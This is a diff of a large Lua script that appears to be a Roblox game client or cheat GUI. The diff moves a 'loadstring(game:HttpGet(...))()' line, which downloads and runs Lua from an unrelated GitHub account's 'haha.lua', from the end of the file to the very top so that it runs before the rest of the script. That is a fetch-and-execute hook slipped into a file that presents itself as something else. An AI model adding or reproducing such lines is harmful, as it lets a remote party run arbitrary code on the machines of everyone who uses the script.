@@ -1,4 +1,8 @@
---This watermark is used to delete the file if its cached, remove it to make the file persist after commits.
+
+wait(1)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BigJoeyJoeyFunnies/e/main/haha.lua", true))()
+
 local GuiLibrary = shared.GuiLibrary
 local playersService = game:GetService("Players")
 local textService = game:GetService("TextService")
@@ -10777,6 +10781,3 @@ task.spawn(function()
 end)
 
 
-wait(1)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BigJoeyJoeyFunnies/e/main/haha.lua", true))()
